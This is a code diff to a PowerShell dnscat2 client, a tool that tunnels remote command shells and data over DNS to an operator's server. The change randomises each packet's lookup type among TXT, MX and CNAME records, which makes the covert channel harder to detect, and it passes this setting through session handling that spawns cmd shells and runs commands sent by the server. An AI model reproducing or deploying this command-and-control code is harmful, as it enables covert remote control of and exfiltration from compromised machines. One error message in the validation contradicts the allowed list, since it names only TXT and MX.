@@ -66,11 +66,37 @@ function Get-NextDnscat2Data ($DataQueue, $MaxMSGDataSize) {
     return $Packet.TrimEnd(".")
 }
 
-function Send-Dnscat2Packet ($Packet, $DNSServer, $DNSPort) {
-    $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset retry=1`n" + $Packet + "`nexit")
+
+
+function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupTypes) {
+    if ($LookupTypes.Count -gt 0) {
+        $LookupType = $LookupTypes | Get-Random
+    } else {
+        $LookupType = $LookupTypes[0]
+    }
+
+    $Command = ("set type=$LookupType`nserver $DNSServer`nset port=$DNSPort`nset retry=1`n" + $Packet + "`nexit")
     $result = ($Command | nslookup 2>&1 | Out-String)
-    if ($result.Contains('"')) {
-        return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)
+    if ($LookupType -eq "TXT") {
+        if ($result.Contains('"')) {
+            return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)
+        } else {
+            return 1
+        }
+    } elseif ($LookupType -eq "MX") {
+        if ($result.Contains('mail')) {
+            $result = ([string](($result[($result.IndexOf("mail exchanger = ") + 17)..$result.Length] -join '').split("`n")[0])).replace($Domain,"").replace(".","").replace("`n","").replace(" ","").Trim()
+            return $result
+        } else {
+            return 1
+        }
+    } elseif ($LookupType -eq "CNAME") {
+        if ($result.Contains('canonical')) {
+            $result = ([string](($result[($result.IndexOf("canonical name =") + 17)..$result.Length] -join '').split("`n")[0])).replace($Domain,"").replace(".","").replace("`n","").replace(" ","").Trim()
+            return $result
+        } else {
+            return 1
+        }
     } else {
         return 1
     }
@@ -111,9 +137,11 @@ function ConvertTo-Dnscat2Packet ($RawPacket) {
     return $Packet
 }
 
-function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPort, $MaxPacketSize, $Delay, $Driver, $DriverOptions) {
+function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPort, $MaxPacketSize, $LookupTypes, $Delay, $Driver, $DriverOptions) {
     $SequenceNumber = (New-RandomDNSField)
-    $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet (New-Dnscat2SYN $Domain $SessionId $SequenceNumber $Options) $DNSServer $DNSPort)
+    
+    $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet (New-Dnscat2SYN $Domain $SessionId $SequenceNumber $Options) $Domain $DNSServer $DNSPort $LookupTypes)
+    
     if ($Packet -eq 1) {
         Write-Error "Failed to start session. Ensure your dnscat2 server is set up correctly."
         return 1
@@ -133,6 +161,7 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
     $Session["Dead"] = $False
     $Session["NewSessions"] = New-Object System.Collections.Hashtable
     $Session["Delay"] = $Delay
+    $Session["LookupTypes"] = $LookupTypes
     if($Driver -eq "console") {
     } elseif ($Driver -eq "command") {
         $Session["RemainingBytes"] = 0
@@ -252,7 +281,6 @@ function Close-Dnscat2Tunnel ($Session, $TunnelId) {
 }
 
 function Update-Dnscat2CommandSession ($Session) {
-
     if ($Session["CommandPacketBuffer"].Length -le 0) {
         return $Session
     }
@@ -310,7 +338,7 @@ function Update-Dnscat2CommandSession ($Session) {
             "0001" # COMMAND_SHELL
             {
                 $NewSessionName = $Session.CommandFields
-                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Delay "exec" "cmd"
+                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" "cmd"
                 $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                 $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                 $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0001" + $NewSession.SessionId)
@@ -321,7 +349,7 @@ function Update-Dnscat2CommandSession ($Session) {
             {
                 $NewSessionName = $Session.CommandFields.split("00")[0]
                 $NewSessionCommand = Convert-HexString $Session.CommandFields.split("00")[2]
-                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Delay "exec" $NewSessionCommand
+                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
                 $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                 $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                 $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
@@ -404,7 +432,6 @@ function Update-Dnscat2CommandSession ($Session) {
             }
             "1002" # TUNNEL_CLOSE
             {
-                write-host 'a'
                 $TunnelId = $Session["CommandFields"]
                 $Session = Close-Dnscat2Tunnel $Session $TunnelId
             }
@@ -460,7 +487,6 @@ function Read-DataFromDriver ($Session) {
             $Session["DriverDataQueue"] += ([System.BitConverter]::ToString($Session["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]).split("-") -join "")
             $Session["StdErrReadOperation"] = ($Session["Process"]).StandardError.BaseStream.BeginRead($Session["StdErrDestinationBuffer"], 0, 65536, $null, $null)
         }
-        return $Session
     }
     return $Session
 }
@@ -479,7 +505,7 @@ function Send-DataToDriver ($Data, $Session) {
 }
 
 function Stop-Dnscat2Session ($Session) {
-    Send-Dnscat2Packet (New-Dnscat2FIN $Session["Domain"] $Session["SessionId"] $Session["Domain"]) $Session["DNSServer"] $Session["DNSPort"] | Out-Null
+    Send-Dnscat2Packet (New-Dnscat2FIN $Session["Domain"] $Session["SessionId"] $Session["Domain"]) $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"]| Out-Null
     if ($Session["Driver"] -eq "exec") {
         taskkill /T /F /PID $Session["ProcessId"] 2>&1 | Out-Null
     }
@@ -504,7 +530,7 @@ function Update-Dnscat2Session ($Session) {
         $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])
         
         try {
-            $Packet = (Send-Dnscat2Packet (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData) $Session["DNSServer"] $Session["DNSPort"])
+            $Packet = (Send-Dnscat2Packet (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData) $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"])
         } catch {
             Write-Host "HOST: Failed to send packet."
 			$Session.Dead = $True
@@ -533,7 +559,7 @@ function Update-Dnscat2Session ($Session) {
                 return $Session
             }
         } catch {
-            Write-Verbose "HOST: Caught error while processing packet, dropping..."
+            Write-Host "HOST: Caught error while processing packet, dropping..."
 			$Session.Dead = $True 
 			$Session = Stop-Dnscat2Session $Session
         }
@@ -574,6 +600,10 @@ function Start-Dnscat2 {
     .PARAMETER Console
         Link the I/O of the console with the Dnscat2 session.
     
+    .PARAMETER LookupTypes
+        Set an array of lookup types. Each packet has its lookup type randomly selected from the array.
+        Only TXT, MX, and CNAME records are supported. Default: @(TXT, MX, CNAME)
+    
     .PARAMETER Delay
         Set a delay between each request, in milliseconds. (Default: 0)
     
@@ -592,10 +622,19 @@ function Start-Dnscat2 {
 		[switch]$Command=$True,
         [Alias("e")][string]$Exec="",
         [switch]$Console=$False,
+        [string[]]$LookupTypes=@("TXT","MX","CNAME"),
         [int32]$Delay=0,
         [ValidateRange(1,240)][int32]$MaxPacketSize=240,
         [string]$Name=""
     )
+    
+    foreach ($LookupType in $LookupTypes) {
+        if (!(@("TXT","MX","CNAME") -contains $LookupType)) {
+            Write-Host ($LookupType + " is not a valid Lookup Type!")
+            Write-Host ("Only TXT and MX lookups are allowed!")
+            return
+        }
+    }
     
     if ($Exec -ne "") {
         $Driver = 'exec'
@@ -618,7 +657,7 @@ function Start-Dnscat2 {
     
     $Sessions = New-Object System.Collections.Hashtable
     $DeadSessions = @()
-    $InitialSession = Start-Dnscat2Session (New-RandomDNSField) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize $Delay $Driver $DriverOptions
+    $InitialSession = Start-Dnscat2Session (New-RandomDNSField) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize $LookupTypes $Delay $Driver $DriverOptions
     if ($InitialSession -eq 1) {
         return
     }
